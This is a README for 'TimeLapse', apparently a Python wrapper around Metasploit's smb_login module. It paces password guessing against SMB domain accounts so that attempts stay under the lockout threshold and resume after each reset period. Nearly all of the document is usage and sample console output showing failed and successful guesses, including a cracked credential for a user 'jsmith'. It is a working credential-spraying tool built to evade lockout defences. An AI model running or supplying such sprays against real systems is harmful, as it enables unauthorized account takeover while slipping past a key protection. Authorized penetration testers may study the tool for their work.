# TimeLapse
TimeLapse is a wrapper around the metasploit smb_login module which will allow you to input a SMB target, domain name, password policy settings and it will delay password guessing to ensure that it leaves suffient attempts for a user, while cycling every reset period without locking out the account.

##Usage:
$: ./TimeLapse.py 
Usage: ./TimeLapse.py username file password file

##Example:
./TimeLapse.py users.lst pass2.lst   

--- Time Lapse Password Guesser ---  
Please use with caution and intelligence  
  
Please enter SMB target: [example: 192.168.1.10]: 172.16.0.150  
Please enter the Domain name: [example: example.com]: example.com  
Please enter the tries before lockout: [example: 3]: 5  
Please enter the reset timer in minutes: [example: 30]: 30  
RHOSTS => 172.16.0.150  
SMBDOMAIN => example.com  
USER_FILE => users.lst  
PASS_FILE => pass_file.tmp  
[*] Spooling to file TimeLapse.log...  
[*] 172.16.0.150:445 SMB - Starting SMB login bruteforce  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\jsmith:admin', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\jsmith:Admin', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\jsmith:Test123', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\msmith:admin', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\msmith:Admin', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\msmith:Test123', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\wsmith:admin', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\wsmith:Admin', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\wsmith:Test123', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[*] Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed  
Hit Maximum Attempts, sleeping for 35 minutes.  
RHOSTS => 172.16.0.150  
SMBDOMAIN => example.com  
USER_FILE => users.lst  
PASS_FILE => pass_file.tmp  
[*] Spooling to file TimeLapse.log...  
[*] 172.16.0.150:445 SMB - Starting SMB login bruteforce  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\jsmith:guest', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[+] 172.16.0.150:445 SMB - Success: 'example.com\jsmith:Winter2016'  
[*] 172.16.0.150:445 SMB - Domain is ignored for user jsmith  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\msmith:guest', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\msmith:Winter2016', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\msmith:Guest', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\wsmith:guest', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\wsmith:Winter2016', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[-] 172.16.0.150:445 SMB - Failed: 'example.com\wsmith:Guest', Login Failed: The server responded with error: STATUS_LOGON_FAILURE (Command=115 WordCount=0)  
[*] Scanned 1 of 1 hosts (100% complete)  
[*] Auxiliary module execution completed  
Hit Maximum Attempts, sleeping for 35 minutes.  
